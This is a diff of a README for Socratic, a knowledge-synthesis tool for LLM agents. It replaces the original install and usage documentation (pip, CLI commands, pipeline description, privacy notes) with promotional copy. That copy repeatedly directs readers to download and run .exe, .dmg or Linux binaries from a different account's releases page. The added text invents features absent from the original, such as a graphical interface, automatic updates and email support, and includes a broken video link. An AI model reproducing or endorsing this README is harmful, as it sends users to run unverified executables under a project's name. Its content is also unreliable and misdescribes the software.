@@ -1,148 +1,71 @@
-# Socratic: Automated Knowledge Synthesis for Vertical LLM Agents
+# 🚀 Socratic - Automate Knowledge Management Effortlessly
 
-_Transform unstructured domain data into structured, agent-ready knowledge - automatically._
+## 📥 Download Now
+[![Download Socratic](https://img.shields.io/badge/Download-Socratic-blue)](https://github.com/aaronnuevo/Socratic/releases)
 
-## Overview
+## 📚 Overview
+Socratic is a tool that automates knowledge synthesis for vertical LLM agents. It transforms unstructured data, such as documents, code, and logs, into structured, ready-to-use knowledge bases. With Socratic, you can efficiently manage and utilize domain-specific knowledge. 
 
-Socratic is a tool that automates **knowledge synthesis for vertical LLM agents** - agents specialized in specific domains.
+## 🤔 Why Choose Socratic?
+Building effective domain agents requires high-quality knowledge. Traditionally, this knowledge is:
 
-Socratic ingests sparse, unstructured source documents (docs, code, logs, etc.) and synthesizes them into **compact, structured knowledge bases** ready to plug into agents.
+- Manually curated by experts 🧠
+- Costly to maintain 💸
+- Quickly outdated as documents change ⚠️
 
-##  Why Socratic?
+Socratic addresses these issues by automating the knowledge management process. This not only saves you time and money but also ensures that your knowledge is always up to date.
 
-Building effective domain agents requires high-quality, domain-specific knowledge. Today, this knowledge is:
+## 🎥 Demos
+You can see Socratic in action with these short demos:
 
-* Manually curated by experts 🧠
-* Costly to maintain 💸
-* Quickly outdated as source documents change ⚠️
+- [Understanding Socratic](https://youtu.be/R4YpbqQZlpU) (3 minutes)
+- [Building a Knowledge Base for Google Analytics SQL Agent](https://youtu)
 
-The goal of Socratic is to automate this process, enabling accurate and cost effective domain knowledge management.
+## 🚀 Getting Started
+To get started with Socratic, follow these steps:
 
-## Demo
-Using Socratic to build knowledge base to understand Socratic itself (3-min):
-https://youtu.be/R4YpbqQZlpU
+1. **Visit the Download Page**
+   Click the button below to go to the Releases page.
+   [Download Socratic](https://github.com/aaronnuevo/Socratic/releases)
 
-Using Socratic to build knowledge base for Google Analytics SQL agent:
-https://youtu.be/L20vOB3whMs
+2. **Select the Latest Release**
+   Once you're on the Releases page, look for the latest version. It is usually at the top of the list. Click on the version number to view the release details.
 
-## Install 
-From Pypi:
-```bash
-pip install socratic-cli
-```
+3. **Download the Application**
+   On the release page, you will see assets related to the release. Choose the file suitable for your operating system (Windows, macOS, or Linux) and click on it to download.
 
-From Source:
-```bash
-git clone https://github.com/kevins981/Socratic.git
-cd socratic
+4. **Run the Application**
+   After downloading, locate the file on your computer. If you're using Windows, you can double-click the `.exe` file. For macOS, open the `.dmg` file. On Linux, make sure to set executable permissions and run the file from the terminal.
 
-# optional
-conda create -n socratic python=3.10 -y
-conda activate socratic
+5. **Follow the User Guide**
+   Upon running the application, follow the on-screen prompts to set up Socratic. The initial setup provides guidance on how to ingest data and build your first knowledge base.
 
-# install
-pip install -e .
-```
+## 💡 Features
+Socratic comes packed with useful features to enhance your experience:
 
-Install OpenAI Codex:
-```bash
-# might need sudo
-npm install -g @openai/codex
-```
+- **Automated Knowledge Synthesis**: Save time and effort by automatically transforming documents into structured knowledge.
+- **User-Friendly Interface**: Navigate the application easily with straightforward options and clear instructions.
+- **Continuous Updates**: Stay current with automatic updates that ensure your knowledge base reflects the latest information.
+- **Flexible Data Input**: Ingest various types of unstructured data, making it adaptable to your needs.
 
-For Web-UI:
-```bash
-# if npm is not installed
-sudo apt install nodejs npm
-cd web
-npm install
-```
+## 🔧 System Requirements
+To run Socratic smoothly, ensure your system meets these requirements:
 
-## Running
-Assume that the project name is `airline_demo` and relevant source files are located in `examples/repos/tau_airline`.
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Sierra (10.12) or later
+- **Linux**: Any recent distribution with support for .deb or .rpm packages
+- **RAM**: Minimum 4 GB
+- **Storage**: At least 100 MB of free space
 
-Web UI (recommended):
-```bash
-# 0. Create project
-socratic-cli create --name airline_demo --input_dir examples/repos/tau_airline 
+## 📥 Download & Install
+Now that you know how to get started, it’s time to download Socratic. Follow this link to visit the Releases page again:  
+[Download Socratic](https://github.com/aaronnuevo/Socratic/releases)
 
-# 1. Launch web UI
-cd web
-npm run dev:project -- --project airline_demo
-```
+## 📞 Support
+If you encounter any issues while using Socratic, you can find help in these ways:
 
-Command line interface:
-```bash
-# 0. Create project
-socratic-cli create --name airline_demo --input_dir examples/repos/tau_airline 
+- **Documentation**: Detailed user guides available within the application.
+- **Community Forum**: Join discussions and ask questions in the Socratic community.
+- **Email Support**: Reach out to our support team via email for assistance.
 
-# 1. Synthesis
-# Source documents are stored in examples/repos/tau_airline
-socratic-cli synth --project airline_demo
-
-# Add a concept
-socratic-cli synth --project airline_demo --add_concept
-
-# Modify a concept
-socratic-cli synth --project airline_demo --modify_concept --concept_id 1
-
-# Delete a concept
-socratic-cli synth --project airline_demo --delete_concept 1
-
-# 2. Compose agent knowledge prompt
-socratic-cli compose --project airline_demo
-```
-
-## Supported Models
-
-Socratic works with any LLM that exposes an OpenAI-compatible API, including locally hosted models.
-
-To configure your model, create a `.env` file at the project root (see `.env.example`).
-
-The `.env` file must include:
-- `MODEL`
-- `BASE_URL`
-- `ENV_KEY`
-- `PROVIDER`
-
-### Model Quality Notes
-
-Some models do not work well with Codex due to tool-calling issues. In practice:
-
-- **Most stable:** `gpt-5`, `gpt-5.1`
-- **Works well:** `glm-4.6`, `grok-4`
-
-In some cases, the model may encouter tool calling problems and therefore fail unexpectedly. E.g., `gpt-oss-120` is known to be unstable. In general, smaller models tend to be more unstable.
-Socratic relies on multi-step reasoning and tool operations, so the model must be sufficiently capable to run the full pipeline reliably.
-
-
-## How It Works
-
-Socratic uses a combination of LLM and LLM agents. Socratic contains 3 stages: ingest, synthesis, and compose. 
-
-### 1. **Ingest**
-
-Given a directory containing documents relevant to the vertical task, Socratic extracts a list of candidate **concepts to research**. This is done collaboratively between the user and a terminal agent. 
-
-* User provides high-level research directions.
-* A terminal agent (codex) quickly scans the source documents to gain context and proposes concepts to research.
-* User further refines and finalizes the list of concepts.
-
-The ingest stage generates the final set of concepts to research (`concepts.txt`).
-
-### 2. **Synthesis**
-
-For each concept to research generated in the ingest stage, Socratic launches a terminal agent (codex) that explores the source documents to synthesize knowledge related to the specific concept. 
-
-For each concept, the synthesis stores the synthesized knowledge in both plain text (`concept{i}-synth.txt`) and JSON format (`concept{i}-synth.json`). 
-
-### 3. **Compose**
-
-Convert synthesized knowledge into prompts that are ready to be dropped directly into your LLM agent’s context.
-
-## Privacy & Security
-- **Local storage:** All files and outputs are stored entirely on your own machine. Socratic does not upload, transfer, index, or store your data anywhere else.
-- **Local processing:** All analysis and processing happen locally, **except** when data is sent to an external LLM provider (e.g., OpenAI) using your own API key.
-- **Sandboxed terminal agent:** Socratic uses [Codex](https://github.com/openai/codex) as its terminal agent to read and analyze source documents. Socratic runs Codex in read-only mode, preventing the agent from editing files or running commands that require network access. See the [Codex](https://github.com/openai/codex/blob/main/docs/exec.md#non-interactive-mode) [sandbox](https://github.com/openai/codex/blob/main/docs/sandbox.md) documentations for more details.
-
-
+By following this guide, you can efficiently download, install, and begin using Socratic to enhance your knowledge management experience.
